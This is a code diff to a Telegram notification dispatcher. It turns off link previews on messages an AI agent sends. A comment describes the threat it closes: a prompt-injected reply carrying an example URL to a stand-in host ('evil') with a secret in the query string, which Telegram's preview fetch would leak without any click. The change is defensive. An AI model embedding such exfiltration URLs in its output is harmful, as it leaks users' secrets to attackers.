@@ -9,6 +9,18 @@
 
 const TELEGRAM_API = "https://api.telegram.org/bot";
 
+/**
+ * #3231: every message the agent authors goes out with link previews off.
+ * With previews on, Telegram's servers fetch any URL in the text the moment it
+ * is sent, so a prompt-injected reply carrying `https://evil/?q=<secret>`
+ * leaks the secret with no click from anyone. Previews are not worth that.
+ * `link_preview_options` is the Bot API 7.0 field; it replaced the
+ * deprecated `disable_web_page_preview`, so only one is sent.
+ */
+export const NO_LINK_PREVIEW = {
+	link_preview_options: { is_disabled: true },
+} as const;
+
 export type NotificationType =
 	| "task-created"
 	| "task-progress"
@@ -228,6 +240,7 @@ export class NotificationDispatcher {
 					chat_id: this.primaryChatId,
 					text: message,
 					parse_mode: "Markdown",
+					...NO_LINK_PREVIEW,
 					reply_markup: {
 						inline_keyboard: [buttons],
 					},
@@ -259,6 +272,7 @@ export class NotificationDispatcher {
 						chat_id: chatId,
 						text: chunk,
 						parse_mode: "Markdown",
+						...NO_LINK_PREVIEW,
 					}),
 				});
 			} catch {
@@ -266,7 +280,7 @@ export class NotificationDispatcher {
 				await fetch(`${TELEGRAM_API}${this.token}/sendMessage`, {
 					method: "POST",
 					headers: { "Content-Type": "application/json" },
-					body: JSON.stringify({ chat_id: chatId, text: chunk }),
+					body: JSON.stringify({ chat_id: chatId, text: chunk, ...NO_LINK_PREVIEW }),
 				}).catch(() => {});
 			}
 		}
